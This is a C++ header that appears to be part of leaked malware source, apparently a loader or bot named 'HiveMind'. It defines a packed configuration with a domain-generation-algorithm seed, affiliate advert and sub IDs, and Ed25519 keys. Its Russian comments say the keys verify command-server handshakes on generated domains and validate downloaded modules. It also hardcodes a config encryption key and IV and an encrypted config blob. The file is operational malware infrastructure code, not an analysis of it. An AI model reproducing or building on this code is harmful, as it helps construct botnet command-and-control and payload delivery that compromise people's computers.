#pragma once

#include "global.hpp"

#define sign_ed25519_PUBLICKEYBYTES 32U
#define sign_ed25519_PRIVATEKEYBYTES 64U
#define sign_ed25519_SEEDBYTES 32U
#define sign_ed25519_SHAREDSECBYTES 32U

#pragma pack(1)
struct HiveMindConfig
{
	DWORD dwDGASeed;
	DWORD dwAdvertID;
	DWORD dwSubID;
	// публичный ключ сервера для проверки в handshake-верификации дга домена
	unsigned char ed25519_server_publickey[sign_ed25519_PUBLICKEYBYTES];
	// публичный ключ модулей для проверки валидности модуля при загрузке
	unsigned char ed25519_module_publickey[sign_ed25519_PUBLICKEYBYTES];
};
#pragma pack()

#define CONFIG_KEY "82709784547583932748352793275748"
#define CONFIG_IV "09843197"


/* G:\Work\APRCS\ConfigCreator\Release\config.bin (3/6/2021 6:56:07 AM)
StartOffset(h): 00000000, EndOffset(h): 0000004B, Length(h): 0000004C */

namespace config
{

	/* C:\Work\APRCS\ConfigCreator\Release\config.bin (14.12.2021 11:48:37)
	StartOffset(h): 00000000, EndOffset(h): 0000004B, Length(h): 0000004C */

	/* C:\Work\APRCS\ConfigCreator\Release\config.bin (27.12.2021 10:36:19)
	StartOffset(h): 00000000, EndOffset(h): 0000004B, Length(h): 0000004C */

	static unsigned char rawData[76] = {
		0xCE, 0x0E, 0x21, 0x1D, 0x29, 0x1F, 0xBE, 0x1D, 0x51, 0x8E, 0x1A, 0x2B,
		0x63, 0x88, 0xAE, 0xC9, 0xF1, 0x1B, 0x58, 0x2A, 0xF4, 0xCE, 0x16, 0xEF,
		0xFF, 0xB4, 0x1E, 0x3B, 0x3B, 0xDE, 0x94, 0x91, 0xD8, 0x56, 0xF5, 0x06,
		0x7D, 0x47, 0x1F, 0xC5, 0xBB, 0x15, 0x5F, 0x96, 0xEA, 0x58, 0x88, 0xAD,
		0x08, 0xDD, 0x90, 0xFD, 0xDA, 0xCB, 0xEB, 0x29, 0x15, 0x5D, 0xE9, 0xF5,
		0x63, 0xFB, 0xC2, 0x45, 0xB8, 0xD6, 0xCA, 0x09, 0xEE, 0x35, 0x06, 0x07,
		0x9B, 0x4C, 0x74, 0xE3
	};



}
